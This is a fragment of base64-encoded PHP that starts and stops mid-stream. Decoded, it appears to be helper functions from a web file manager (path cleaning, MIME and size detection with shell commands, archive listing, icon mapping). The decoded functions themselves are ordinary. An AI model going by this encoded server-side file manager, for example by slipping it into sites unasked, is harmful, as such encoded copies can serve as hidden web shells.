XR1cm4gJG9rOw0KfQ0KDQovKioNCiAqIEdldCBtaW1lIHR5cGUNCiAqIEBwYXJhbSBzdHJpbmcgJGZpbGVfcGF0aA0KICogQHJldHVybiBtaXhlZHxzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKQ0Kew0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2ZpbmZvX29wZW4nKSkgew0KICAgICAgICAkZmluZm8gPSBmaW5mb19vcGVuKEZJTEVJTkZPX01JTUVfVFlQRSk7DQogICAgICAgICRtaW1lID0gZmluZm9fZmlsZSgkZmluZm8sICRmaWxlX3BhdGgpOw0KICAgICAgICBmaW5mb19jbG9zZSgkZmluZm8pOw0KICAgICAgICByZXR1cm4gJG1pbWU7DQogICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWltZV9jb250ZW50X3R5cGUnKSkgew0KICAgICAgICByZXR1cm4gbWltZV9jb250ZW50X3R5cGUoJGZpbGVfcGF0aCk7DQogICAgfSBlbHNlaWYgKCFzdHJpc3RyKGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyksICdzaGVsbF9leGVjJykpIHsNCiAgICAgICAgJGZpbGUgPSBlc2NhcGVzaGVsbGFyZygkZmlsZV9wYXRoKTsNCiAgICAgICAgJG1pbWUgPSBzaGVsbF9leGVjKCdmaWxlIC1iaSAnIC4gJGZpbGUpOw0KICAgICAgICByZXR1cm4gJG1pbWU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICctLSc7DQogICAgfQ0KfQ0KDQovKioNCiAqIEhUVFAgUmVkaXJlY3QNCiAqIEBwYXJhbSBzdHJpbmcgJHVybA0KICogQHBhcmFtIGludCAkY29kZQ0KICovDQpmdW5jdGlvbiBmbV9yZWRpcmVjdCgkdXJsLCAkY29kZSA9IDMwMikNCnsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJHVybCwgdHJ1ZSwgJGNvZGUpOw0KICAgIGV4aXQ7DQp9DQoNCi8qKg0KICogUGF0aCB0cmF2ZXJzYWwgcHJldmVudGlvbiBhbmQgY2xlYW4gdGhlIHVybA0KICogSXQgcmVwbGFjZXMgKGNvbnNlY3V0aXZlKSBvY2N1cnJlbmNlcyBvZiAvIGFuZCBcXCB3aXRoIHdoYXRldmVyIGlzIGluIERJUkVDVE9SWV9TRVBBUkFUT1IsIGFuZCBwcm9jZXNzZXMgLy4gYW5kIC8uLiBmaW5lLg0KICogQHBhcmFtICRwYXRoDQogKiBAcmV0dXJuIHN0cmluZw0KICovDQpmdW5jdGlvbiBnZXRfYWJzb2x1dGVfcGF0aCgkcGF0aCkgew0KICAgICRwYXRoID0gc3RyX3JlcGxhY2UoYXJyYXkoJy8nLCAnXFwnKSwgRElSRUNUT1JZX1NFUEFSQVRPUiwgJHBhdGgpOw0KICAgICRwYXJ0cyA9IGFycmF5X2ZpbHRlcihleHBsb2RlKERJUkVDVE9SWV9TRVBBUkFUT1IsICRwYXRoKSwgJ3N0cmxlbicpOw0KICAgICRhYnNvbHV0ZXMgPSBhcnJheSgpOw0KICAgIGZvcmVhY2ggKCRwYXJ0cyBhcyAkcGFydCkgew0KICAgICAgICBpZiAoJy4nID09ICRwYXJ0KSBjb250aW51ZTsNCiAgICAgICAgaWYgKCcuLicgPT0gJHBhcnQpIHsNCiAgICAgICAgICAgIGFycmF5X3BvcCgkYWJzb2x1dGVzKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRhYnNvbHV0ZXNbXSA9ICRwYXJ0Ow0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBpbXBsb2RlKERJUkVDVE9SWV9TRVBBUkFUT1IsICRhYnNvbHV0ZXMpOw0KfQ0KDQovKioNCiAqIENsZWFuIHBhdGgNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2NsZWFuX3BhdGgoJHBhdGgsICR0cmltID0gdHJ1ZSkNCnsNCiAgICAkcGF0aCA9ICR0cmltID8gdHJpbSgkcGF0aCkgOiAkcGF0aDsNCiAgICAkcGF0aCA9IHRyaW0oJHBhdGgsICdcXC8nKTsNCiAgICAkcGF0aCA9IHN0cl9yZXBsYWNlKGFycmF5KCcuLi8nLCAnLi5cXCcpLCAnJywgJHBhdGgpOw0KICAgICRwYXRoID0gIGdldF9hYnNvbHV0ZV9wYXRoKCRwYXRoKTsNCiAgICBpZiAoJHBhdGggPT0gJy4uJykgew0KICAgICAgICAkcGF0aCA9ICcnOw0KICAgIH0NCiAgICByZXR1cm4gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcGF0aCk7DQp9DQoNCi8qKg0KICogR2V0IHBhcmVudCBwYXRoDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcmV0dXJuIGJvb2x8c3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2dldF9wYXJlbnRfcGF0aCgkcGF0aCkNCnsNCiAgICAkcGF0aCA9IGZtX2NsZWFuX3BhdGgoJHBhdGgpOw0KICAgIGlmICgkcGF0aCAhPSAnJykgew0KICAgICAgICAkYXJyYXkgPSBleHBsb2RlKCcvJywgJHBhdGgpOw0KICAgICAgICBpZiAoY291bnQoJGFycmF5KSA+IDEpIHsNCiAgICAgICAgICAgICRhcnJheSA9IGFycmF5X3NsaWNlKCRhcnJheSwgMCwgLTEpOw0KICAgICAgICAgICAgcmV0dXJuIGltcGxvZGUoJy8nLCAkYXJyYXkpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnJzsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQpmdW5jdGlvbiBmbV9nZXRfZGlzcGxheV9wYXRoKCRmaWxlX3BhdGgpDQp7DQogICAgZ2xvYmFsICRwYXRoX2Rpc3BsYXlfbW9kZSwgJHJvb3RfcGF0aCwgJHJvb3RfdXJsOw0KICAgIHN3aXRjaCAoJHBhdGhfZGlzcGxheV9tb2RlKSB7DQogICAgICAgIGNhc2UgJ3JlbGF0aXZlJzoNCiAgICAgICAgICAgIHJldHVybiBhcnJheSgNCiAgICAgICAgICAgICAgICAnbGFiZWwnID0+ICdQYXRoJywNCiAgICAgICAgICAgICAgICAncGF0aCcgPT4gZm1fZW5jKGZtX2NvbnZlcnRfd2luKHN0cl9yZXBsYWNlKCRyb290X3BhdGgsICcnLCAkZmlsZV9wYXRoKSkpDQogICAgICAgICAgICApOw0KICAgICAgICBjYXNlICdob3N0JzoNCiAgICAgICAgICAgICRyZWxhdGl2ZV9wYXRoID0gc3RyX3JlcGxhY2UoJHJvb3RfcGF0aCwgJycsICRmaWxlX3BhdGgpOw0KICAgICAgICAgICAgcmV0dXJuIGFycmF5KA0KICAgICAgICAgICAgICAgICdsYWJlbCcgPT4gJ0hvc3QgUGF0aCcsDQogICAgICAgICAgICAgICAgJ3BhdGgnID0+IGZtX2VuYyhmbV9jb252ZXJ0X3dpbignLycgLiAkcm9vdF91cmwgLiAnLycgLiBsdHJpbShzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRyZWxhdGl2ZV9wYXRoKSwgJy8nKSkpDQogICAgICAgICAgICApOw0KICAgICAgICBjYXNlICdmdWxsJzoNCiAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgIHJldHVybiBhcnJheSgNCiAgICAgICAgICAgICAgICAnbGFiZWwnID0+ICdGdWxsIFBhdGgnLA0KICAgICAgICAgICAgICAgICdwYXRoJyA9PiBmbV9lbmMoZm1fY29udmVydF93aW4oJGZpbGVfcGF0aCkpDQogICAgICAgICAgICApOw0KICAgIH0NCn0NCg0KLyoqDQogKiBDaGVjayBmaWxlIGlzIGluIGV4Y2x1ZGUgbGlzdA0KICogQHBhcmFtIHN0cmluZyAkZmlsZQ0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX2lzX2V4Y2x1ZGVfaXRlbXMoJGZpbGUpIHsNCiAgICAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgaWYgKGlzc2V0KCRleGNsdWRlX2l0ZW1zKSBhbmQgc2l6ZW9mKCRleGNsdWRlX2l0ZW1zKSkgew0KICAgICAgICB1bnNldCgkZXhjbHVkZV9pdGVtcyk7DQogICAgfQ0KDQogICAgJGV4Y2x1ZGVfaXRlbXMgPSBGTV9FWENMVURFX0lURU1TOw0KICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc3LjAuMCcsICc8JykpIHsNCiAgICAgICAgJGV4Y2x1ZGVfaXRlbXMgPSB1bnNlcmlhbGl6ZSgkZXhjbHVkZV9pdGVtcyk7DQogICAgfQ0KICAgIGlmICghaW5fYXJyYXkoJGZpbGUsICRleGNsdWRlX2l0ZW1zKSAmJiAhaW5fYXJyYXkoIiouJGV4dCIsICRleGNsdWRlX2l0ZW1zKSkgew0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovKioNCiAqIGdldCBsYW5ndWFnZSB0cmFuc2xhdGlvbnMgZnJvbSBqc29uIGZpbGUNCiAqIEBwYXJhbSBpbnQgJHRyDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF90cmFuc2xhdGlvbnMoJHRyKSB7DQogICAgdHJ5IHsNCiAgICAgICAgJGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJ3RyYW5zbGF0aW9uLmpzb24nKTsNCiAgICAgICAgaWYoJGNvbnRlbnQgIT09IEZBTFNFKSB7DQogICAgICAgICAgICAkbG5nID0ganNvbl9kZWNvZGUoJGNvbnRlbnQsIFRSVUUpOw0KICAgICAgICAgICAgZ2xvYmFsICRsYW5nX2xpc3Q7DQogICAgICAgICAgICBmb3JlYWNoICgkbG5nWyJsYW5ndWFnZSJdIGFzICRrZXkgPT4gJHZhbHVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRjb2RlID0gJHZhbHVlWyJjb2RlIl07DQogICAgICAgICAgICAgICAgJGxhbmdfbGlzdFskY29kZV0gPSAkdmFsdWVbIm5hbWUiXTsNCiAgICAgICAgICAgICAgICBpZiAoJHRyKQ0KICAgICAgICAgICAgICAgICAgICAkdHJbJGNvZGVdID0gJHZhbHVlWyJ0cmFuc2xhdGlvbiJdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICR0cjsNCiAgICAgICAgfQ0KDQogICAgfQ0KICAgIGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgZWNobyAkZTsNCiAgICB9DQp9DQoNCi8qKg0KICogQHBhcmFtIHN0cmluZyAkZmlsZQ0KICogUmVjb3ZlciBhbGwgZmlsZSBzaXplcyBsYXJnZXIgdGhhbiA+IDJHQi4NCiAqIFdvcmtzIG9uIHBocCAzMmJpdHMgYW5kIDY0Yml0cyBhbmQgc3VwcG9ydHMgbGludXgNCiAqIEByZXR1cm4gaW50fHN0cmluZw0KICovDQpmdW5jdGlvbiBmbV9nZXRfc2l6ZSgkZmlsZSkNCnsNCiAgICBzdGF0aWMgJGlzd2luOw0KICAgIHN0YXRpYyAkaXNkYXJ3aW47DQogICAgaWYgKCFpc3NldCgkaXN3aW4pKSB7DQogICAgICAgICRpc3dpbiA9IChzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PSAnV0lOJyk7DQogICAgfQ0KICAgIGlmICghaXNzZXQoJGlzZGFyd2luKSkgew0KICAgICAgICAkaXNkYXJ3aW4gPSAoc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwKSkgPT0gIkRBUldJTiIpOw0KICAgIH0NCg0KICAgIHN0YXRpYyAkZXhlY193b3JrczsNCiAgICBpZiAoIWlzc2V0KCRleGVjX3dvcmtzKSkgew0KICAgICAgICAkZXhlY193b3JrcyA9IChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSAmJiAhaW5pX2dldCgnc2FmZV9tb2RlJykgJiYgQGV4ZWMoJ2VjaG8gRVhFQycpID09ICdFWEVDJyk7DQogICAgfQ0KDQogICAgLy8gdHJ5IGEgc2hlbGwgY29tbWFuZA0KICAgIGlmICgkZXhlY193b3Jrcykgew0KICAgICAgICAkYXJnID0gZXNjYXBlc2hlbGxhcmcoJGZpbGUpOw0KICAgICAgICAkY21kID0gKCRpc3dpbikgPyAiZm9yICVGIGluIChcIiRmaWxlXCIpIGRvIEBlY2hvICV+ekYiIDogKCRpc2RhcndpbiA/ICJzdGF0IC1mJXogJGFyZyIgOiAic3RhdCAtYyVzICRhcmciKTsNCiAgICAgICAgQGV4ZWMoJGNtZCwgJG91dHB1dCk7DQogICAgICAgIGlmIChpc19hcnJheSgkb3V0cHV0KSAmJiBjdHlwZV9kaWdpdCgkc2l6ZSA9IHRyaW0oaW1wbG9kZSgiXG4iLCAkb3V0cHV0KSkpKSB7DQogICAgICAgICAgICByZXR1cm4gJHNpemU7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyB0cnkgdGhlIFdpbmRvd3MgQ09NIGludGVyZmFjZQ0KICAgIGlmICgkaXN3aW4gJiYgY2xhc3NfZXhpc3RzKCJDT00iKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJGZzb2JqID0gbmV3IENPTSgnU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QnKTsNCiAgICAgICAgICAgICRmID0gJGZzb2JqLT5HZXRGaWxlKCByZWFscGF0aCgkZmlsZSkgKTsNCiAgICAgICAgICAgICRzaXplID0gJGYtPlNpemU7DQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgJHNpemUgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIGlmIChjdHlwZV9kaWdpdCgkc2l6ZSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkc2l6ZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIGlmIGFsbCBlbHNlIGZhaWxzDQogICAgcmV0dXJuIGZpbGVzaXplKCRmaWxlKTsNCn0NCg0KLyoqDQogKiBHZXQgbmljZSBmaWxlc2l6ZQ0KICogQHBhcmFtIGludCAkc2l6ZQ0KICogQHJldHVybiBzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X2ZpbGVzaXplKCRzaXplKQ0Kew0KICAgICRzaXplID0gKGZsb2F0KSAkc2l6ZTsNCiAgICAkdW5pdHMgPSBhcnJheSgnQicsICdLQicsICdNQicsICdHQicsICdUQicsICdQQicsICdFQicsICdaQicsICdZQicpOw0KICAgICRwb3dlciA9ICgkc2l6ZSA+IDApID8gZmxvb3IobG9nKCRzaXplLCAxMDI0KSkgOiAwOw0KICAgICRwb3dlciA9ICgkcG93ZXIgPiAoY291bnQoJHVuaXRzKSAtIDEpKSA/IChjb3VudCgkdW5pdHMpIC0gMSkgOiAkcG93ZXI7DQogICAgcmV0dXJuIHNwcmludGYoJyVzICVzJywgcm91bmQoJHNpemUgLyBwb3coMTAyNCwgJHBvd2VyKSwgMiksICR1bml0c1skcG93ZXJdKTsNCn0NCg0KLyoqDQogKiBHZXQgdG90YWwgc2l6ZSBvZiBkaXJlY3RvcnkgdHJlZS4NCiAqDQogKiBAcGFyYW0gIHN0cmluZyAkZGlyZWN0b3J5IFJlbGF0aXZlIG9yIGFic29sdXRlIGRpcmVjdG9yeSBuYW1lLg0KICogQHJldHVybiBpbnQgVG90YWwgbnVtYmVyIG9mIGJ5dGVzLg0KICovDQpmdW5jdGlvbiBmbV9nZXRfZGlyZWN0b3J5c2l6ZSgkZGlyZWN0b3J5KSB7DQogICAgJGJ5dGVzID0gMDsNCiAgICAkZGlyZWN0b3J5ID0gcmVhbHBhdGgoJGRpcmVjdG9yeSk7DQogICAgaWYgKCRkaXJlY3RvcnkgIT09IGZhbHNlICYmICRkaXJlY3RvcnkgIT0gJycgJiYgZmlsZV9leGlzdHMoJGRpcmVjdG9yeSkpew0KICAgICAgICBmb3JlYWNoKG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcigkZGlyZWN0b3J5LCBGaWxlc3lzdGVtSXRlcmF0b3I6OlNLSVBfRE9UUykpIGFzICRmaWxlKXsNCiAgICAgICAgICAgICRieXRlcyArPSAkZmlsZS0+Z2V0U2l6ZSgpOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkYnl0ZXM7DQp9DQoNCi8qKg0KICogR2V0IGluZm8gYWJvdXQgemlwIGFyY2hpdmUNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqIEByZXR1cm4gYXJyYXl8Ym9vbA0KICovDQpmdW5jdGlvbiBmbV9nZXRfemlmX2luZm8oJHBhdGgsICRleHQpIHsNCiAgICBpZiAoJGV4dCA9PSAnemlwJyAmJiBmdW5jdGlvbl9leGlzdHMoJ3ppcF9vcGVuJykpIHsNCiAgICAgICAgJGFyY2ggPSBAemlwX29wZW4oJHBhdGgpOw0KICAgICAgICBpZiAoJGFyY2gpIHsNCiAgICAgICAgICAgICRmaWxlbmFtZXMgPSBhcnJheSgpOw0KICAgICAgICAgICAgd2hpbGUgKCR6aXBfZW50cnkgPSBAemlwX3JlYWQoJGFyY2gpKSB7DQogICAgICAgICAgICAgICAgJHppcF9uYW1lID0gQHppcF9lbnRyeV9uYW1lKCR6aXBfZW50cnkpOw0KICAgICAgICAgICAgICAgICR6aXBfZm9sZGVyID0gc3Vic3RyKCR6aXBfbmFtZSwgLTEpID09ICcvJzsNCiAgICAgICAgICAgICAgICAkZmlsZW5hbWVzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICR6aXBfbmFtZSwNCiAgICAgICAgICAgICAgICAgICAgJ2ZpbGVzaXplJyA9PiBAemlwX2VudHJ5X2ZpbGVzaXplKCR6aXBfZW50cnkpLA0KICAgICAgICAgICAgICAgICAgICAnY29tcHJlc3NlZF9zaXplJyA9PiBAemlwX2VudHJ5X2NvbXByZXNzZWRzaXplKCR6aXBfZW50cnkpLA0KICAgICAgICAgICAgICAgICAgICAnZm9sZGVyJyA9PiAkemlwX2ZvbGRlcg0KICAgICAgICAgICAgICAgICAgICAvLydjb21wcmVzc2lvbl9tZXRob2QnID0+IHppcF9lbnRyeV9jb21wcmVzc2lvbm1ldGhvZCgkemlwX2VudHJ5KSwNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQHppcF9jbG9zZSgkYXJjaCk7DQogICAgICAgICAgICByZXR1cm4gJGZpbGVuYW1lczsNCiAgICAgICAgfQ0KICAgIH0gZWxzZWlmKCRleHQgPT0gJ3RhcicgJiYgY2xhc3NfZXhpc3RzKCdQaGFyRGF0YScpKSB7DQogICAgICAgICRhcmNoaXZlID0gbmV3IFBoYXJEYXRhKCRwYXRoKTsNCiAgICAgICAgJGZpbGVuYW1lcyA9IGFycmF5KCk7DQogICAgICAgIGZvcmVhY2gobmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoJGFyY2hpdmUpIGFzICRmaWxlKSB7DQogICAgICAgICAgICAkcGFyZW50X2luZm8gPSAkZmlsZS0+Z2V0UGF0aEluZm8oKTsNCiAgICAgICAgICAgICR6aXBfbmFtZSA9IHN0cl9yZXBsYWNlKCJwaGFyOi8vIi4kcGF0aCwgJycsICRmaWxlLT5nZXRQYXRoTmFtZSgpKTsNCiAgICAgICAgICAgICR6aXBfbmFtZSA9IHN1YnN0cigkemlwX25hbWUsICgkcG9zID0gc3RycG9zKCR6aXBfbmFtZSwgJy8nKSkgIT09IGZhbHNlID8gJHBvcyArIDEgOiAwKTsNCiAgICAgICAgICAgICR6aXBfZm9sZGVyID0gJHBhcmVudF9pbmZvLT5nZXRGaWxlTmFtZSgpOw0KICAgICAgICAgICAgJHppcF9pbmZvID0gbmV3IFNwbEZpbGVJbmZvKCRmaWxlKTsNCiAgICAgICAgICAgICRmaWxlbmFtZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICduYW1lJyA9PiAkemlwX25hbWUsDQogICAgICAgICAgICAgICAgJ2ZpbGVzaXplJyA9PiAkemlwX2luZm8tPmdldFNpemUoKSwNCiAgICAgICAgICAgICAgICAnY29tcHJlc3NlZF9zaXplJyA9PiAkZmlsZS0+Z2V0Q29tcHJlc3NlZFNpemUoKSwNCiAgICAgICAgICAgICAgICAnZm9sZGVyJyA9PiAkemlwX2ZvbGRlcg0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGZpbGVuYW1lczsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovKioNCiAqIEVuY29kZSBodG1sIGVudGl0aWVzDQogKiBAcGFyYW0gc3RyaW5nICR0ZXh0DQogKiBAcmV0dXJuIHN0cmluZw0KICovDQpmdW5jdGlvbiBmbV9lbmMoJHRleHQpDQp7DQogICAgcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoJHRleHQsIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KfQ0KDQovKioNCiAqIFByZXZlbnQgWFNTIGF0dGFja3MNCiAqIEBwYXJhbSBzdHJpbmcgJHRleHQNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2lzdmFsaWRfZmlsZW5hbWUoJHRleHQpIHsNCiAgICByZXR1cm4gKHN0cnBicmsoJHRleHQsICcvPyUqOnwiPD4nKSA9PT0gRkFMU0UpID8gdHJ1ZSA6IGZhbHNlOw0KfQ0KDQovKioNCiAqIFNhdmUgbWVzc2FnZSBpbiBzZXNzaW9uDQogKiBAcGFyYW0gc3RyaW5nICRtc2cNCiAqIEBwYXJhbSBzdHJpbmcgJHN0YXR1cw0KICovDQpmdW5jdGlvbiBmbV9zZXRfbXNnKCRtc2csICRzdGF0dXMgPSAnb2snKQ0Kew0KICAgICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddID0gJG1zZzsNCiAgICAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ3N0YXR1cyddID0gJHN0YXR1czsNCn0NCg0KLyoqDQogKiBDaGVjayBpZiBzdHJpbmcgaXMgaW4gVVRGLTgNCiAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZw0KICogQHJldHVybiBpbnQNCiAqLw0KZnVuY3Rpb24gZm1faXNfdXRmOCgkc3RyaW5nKQ0Kew0KICAgIHJldHVybiBwcmVnX21hdGNoKCcvL3UnLCAkc3RyaW5nKTsNCn0NCg0KLyoqDQogKiBDb252ZXJ0IGZpbGUgbmFtZSB0byBVVEYtOCBpbiBXaW5kb3dzDQogKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZQ0KICogQHJldHVybiBzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fY29udmVydF93aW4oJGZpbGVuYW1lKQ0Kew0KICAgIGlmIChGTV9JU19XSU4gJiYgZnVuY3Rpb25fZXhpc3RzKCdpY29udicpKSB7DQogICAgICAgICRmaWxlbmFtZSA9IGljb252KEZNX0lDT05WX0lOUFVUX0VOQywgJ1VURi04Ly9JR05PUkUnLCAkZmlsZW5hbWUpOw0KICAgIH0NCiAgICByZXR1cm4gJGZpbGVuYW1lOw0KfQ0KDQovKioNCiAqIEBwYXJhbSAkb2JqDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX29iamVjdF90b19hcnJheSgkb2JqKQ0Kew0KICAgIGlmICghaXNfb2JqZWN0KCRvYmopICYmICFpc19hcnJheSgkb2JqKSkgew0KICAgICAgICByZXR1cm4gJG9iajsNCiAgICB9DQogICAgaWYgKGlzX29iamVjdCgkb2JqKSkgew0KICAgICAgICAkb2JqID0gZ2V0X29iamVjdF92YXJzKCRvYmopOw0KICAgIH0NCiAgICByZXR1cm4gYXJyYXlfbWFwKCdmbV9vYmplY3RfdG9fYXJyYXknLCAkb2JqKTsNCn0NCg0KLyoqDQogKiBHZXQgQ1NTIGNsYXNzbmFtZSBmb3IgZmlsZQ0KICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICogQHJldHVybiBzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X2ZpbGVfaWNvbl9jbGFzcygkcGF0aCkNCnsNCiAgICAvLyBnZXQgZXh0ZW5zaW9uDQogICAgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJHBhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOw0KDQogICAgc3dpdGNoICgkZXh0KSB7DQogICAgICAgIGNhc2UgJ2ljbyc6DQogICAgICAgIGNhc2UgJ2dpZic6DQogICAgICAgIGNhc2UgJ2pwZyc6DQogICAgICAgIGNhc2UgJ2pwZWcnOg0KICAgICAgICBjYXNlICdqcGMnOg0KICAgICAgICBjYXNlICdqcDInOg0KICAgICAgICBjYXNlICdqcHgnOg0KICAgICAgICBjYXNlICd4Ym0nOg0KICAgICAgICBjYXNlICd3Ym1wJzoNCiAgICAgICAgY2FzZSAncG5nJzoNCiAgICAgICAgY2FzZSAnYm1wJzoNCiAgICAgICAgY2FzZSAndGlmJzoNCiAgICAgICAgY2FzZSAndGlmZic6DQogICAgICAgIGNhc2UgJ3dlYnAnOg0KICAgICAgICBjYXNlICdhdmlmJzoNCiAgICAgICAgY2FzZSAnc3ZnJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtcGljdHVyZS1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdwYXNzd2QnOg0KICAgICAgICBjYXNlICdmdHBxdW90YSc6DQogICAgICAgIGNhc2UgJ3NxbCc6DQogICAgICAgIGNhc2UgJ2pzJzoNCiAgICAgICAgY2FzZSAndHMnOg0KICAgICAgICBjYXNlICdqc3gnOg0KICAgICAgICBjYXNlICd0c3gnOg0KICAgICAgICBjYXNlICdoYnMnOg0KICAgICAgICBjYXNlICdqc29uJzoNCiAgICAgICAgY2FzZSAnc2gnOg0KICAgICAgICBjYXNlICdjb25maWcnOg0KICAgICAgICBjYXNlICd0d2lnJzoNCiAgICAgICAgY2FzZSAndHBsJzoNCiAgICAgICAgY2FzZSAnbWQnOg0KICAgICAgICBjYXNlICdnaXRpZ25vcmUnOg0KICAgICAgICBjYXNlICdjJzoNCiAgICAgICAgY2FzZSAnY3BwJzoNCiAgICAgICAgY2FzZSAnY3MnOg0KICAgICAgICBjYXNlICdweSc6DQogICAgICAgIGNhc2UgJ3JzJzoNCiAgICAgICAgY2FzZSAnbWFwJzoNCiAgICAgICAgY2FzZSAnbG9jayc6DQogICAgICAgIGNhc2UgJ2R0ZCc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtY29kZS1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICd0eHQnOg0KICAgICAgICBjYXNlICdpbmknOg0KICAgICAgICBjYXNlICdjb25mJzoNCiAgICAgICAgY2FzZSAnbG9nJzoNCiAgICAgICAgY2FzZSAnaHRhY2Nlc3MnOg0KICAgICAgICBjYXNlICd5YW1sJzoNCiAgICAgICAgY2FzZSAneW1sJzoNCiAgICAgICAgY2FzZSAndG9tbCc6DQogICAgICAgIGNhc2UgJ3RtcCc6DQogICAgICAgIGNhc2UgJ3RvcCc6DQogICAgICAgIGNhc2UgJ2JvdCc6DQogICAgICAgIGNhc2UgJ2RhdCc6DQogICAgICAgIGNhc2UgJ2Jhayc6DQogICAgICAgIGNhc2UgJ2h0cGFzc3dkJzoNCiAgICAgICAgY2FzZSAncGwnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXRleHQtbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnY3NzJzoNCiAgICAgICAgY2FzZSAnbGVzcyc6DQogICAgICAgIGNhc2UgJ3Nhc3MnOg0KICAgICAgICBjYXNlICdzY3NzJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtY3NzMyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnYnoyJzoNCiAgICAgICAgY2FzZSAnemlwJzoNCiAgICAgICAgY2FzZSAncmFyJzoNCiAgICAgICAgY2FzZSAnZ3onOg0KICAgICAgICBjYXNlICd0YXInOg0KICAgICAgICBjYXNlICc3eic6DQogICAgICAgIGNhc2UgJ3h6JzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1hcmNoaXZlLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ3BocCc6DQogICAgICAgIGNhc2UgJ3BocDQnOg0KICAgICAgICBjYXNlICdwaHA1JzoNCiAgICAgICAgY2FzZSAncGhwcyc6DQogICAgICAgIGNhc2UgJ3BodG1sJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtY29kZSc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnaHRtJzoNCiAgICAgICAgY2FzZSAnaHRtbCc6DQogICAgICAgIGNhc2UgJ3NodG1sJzoNCiAgICAgICAgY2FzZSAneGh0bWwnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1odG1sNSc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAneG1sJzoNCiAgICAg